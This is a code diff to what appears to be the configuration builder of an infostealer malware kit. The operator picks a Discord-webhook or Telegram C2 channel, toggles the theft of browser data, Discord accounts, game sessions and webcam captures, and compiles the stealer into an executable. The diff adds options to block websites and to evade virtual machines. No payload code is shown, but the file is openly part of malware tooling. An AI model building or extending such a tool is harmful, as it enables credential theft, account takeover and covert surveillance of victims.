@@ -21,6 +21,8 @@ config = {
     "discordacc": False,
     "games": False,
     "webcam": False,
+    "blocksites": False,
+    "antivm": False
 }
 
 def load(file):
@@ -65,6 +67,8 @@ def fetchsettings():
     grabdiscord = config['discordacc']
     grabgames = config['games']
     grabwebcam = config['webcam']
+    blocksites = config['blocksites']
+    antivm = config['antivm']
     if c2type == 'discord':
         print('''Settings
         
@@ -73,7 +77,10 @@ def fetchsettings():
     Grab browsing data: {}
     Grab discord accounts: {}
     Grab game sessions: {}
-    Grab webcam: {}'''.format(c2type, webhookurl, grabbrowsers, grabdiscord, grabgames, grabwebcam))
+    Grab webcam: {}
+    Block websites: {}
+    Anti-VM: {}
+    '''.format(c2type, webhookurl, grabbrowsers, grabdiscord, grabgames, grabwebcam, blocksites, antivm))
     elif c2type == 'telegram':
         print('''Settings
         
@@ -82,14 +89,17 @@ def fetchsettings():
     Grab browsing data: {}
     Grab discord accounts: {}
     Grab game sessions: {}
-    Grab webcam: {}'''.format(c2type, telebot, grabbrowsers, grabdiscord, grabgames, grabwebcam))
+    Grab webcam: {}
+    Block websites: {}
+    Anti-VM: {}
+    '''.format(c2type, telebot, grabbrowsers, grabdiscord, grabgames, grabwebcam, blocksites, antivm))
 
 def menu():
     global config
     asc = Ascii()
     print(asc.ascii())
     print(Options().options())
-    options = ['ChangeC2', 'CollectBrowsers', 'CollectDiscord', 'CollectGames', 'CollectWebcam', 'SaveSettings', 'Compile']
+    options = ['ChangeC2', 'CollectBrowsers', 'CollectDiscord', 'CollectGames', 'CollectWebcam', 'BlockWebsites', 'AntiVM', 'SaveSettings', 'Compile']
     
     fetchsettings()
     opts = {str(i + 1): name for i, name in enumerate(options)}
@@ -143,10 +153,22 @@ def menu():
                 cls()
                 menu()
 
+
+            elif name == 'BlockWebsites':
+                config['blocksites'] = not config['blocksites']
+                cls()
+                menu()
+
+            elif name == 'AntiVM':
+                config['antivm'] = not config['antivm']
+                cls()
+                menu()
+
             elif name == 'SaveSettings':
                 applysettings()
                 cls()
                 menu()
+                
             elif name == 'Compile':
                 applysettings()
                 Logging.info('Turning into an exe')
